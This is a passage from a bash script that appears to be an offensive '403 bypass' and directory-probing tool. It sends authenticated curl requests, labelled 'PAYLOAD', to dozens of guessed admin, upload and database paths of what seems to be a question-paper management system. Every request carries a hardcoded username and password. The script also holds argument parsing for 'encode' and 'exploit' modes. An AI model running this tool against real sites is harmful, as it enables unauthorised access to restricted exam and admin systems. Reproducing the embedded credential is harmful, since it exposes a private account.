${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocMonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocMonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocMonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-TestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-TestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-TestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-DataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-DataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-DataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Monitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Monitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Monitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print

}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
